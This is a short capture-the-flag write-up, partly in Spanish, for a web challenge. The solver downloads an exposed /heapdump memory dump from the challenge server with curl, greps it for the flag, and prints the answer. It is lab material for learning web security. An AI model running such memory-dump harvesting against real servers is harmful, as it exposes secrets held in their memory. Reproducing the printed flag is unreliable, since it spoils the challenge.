# DESCRIPCIÓN:
Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag.

The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden. The website is running [picoCTF News](http://chatelaine.cylabacademy.net:11069/).

Explore backend development with us

The head was dumped.
# SOLUCIÓN:
#### academy{Pat!3nt_15_Th3_K3y_abc961cc}

Explorar el sitio web del reto y revisar el artículo sobre "API Documentation" para descubrir el _endpoint_ oculto. Descargar el volcado de memoria del servidor ejecutando el comando `curl -o volcado.bin` hacia la ruta `/heapdump`. Utilizar la combinación de comandos `strings volcado.bin | grep -E "picoCTF\{|academy\{"` en la terminal para extraer el texto legible del archivo binario y filtrar directamente la Flag.

```
┌──(mony㉿Mony)-[~]
└─$ curl -o volcado.bin http://chatelaine.cylabacademy.net:11069/heapdump
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100 10.74M 100 10.74M   0      0  1.39M      0   00:07   00:07          1.37M

┌──(mony㉿Mony)-[~]
└─$ strings volcado.bin | grep -E "picoCTF\{|academy\{"
academy{Pat!3nt_15_Th3_K3y_abc961cc}
```

# NOTAS ADICIONALES:

# REFERENCIAS:
https://webshell.cylabacademy.org/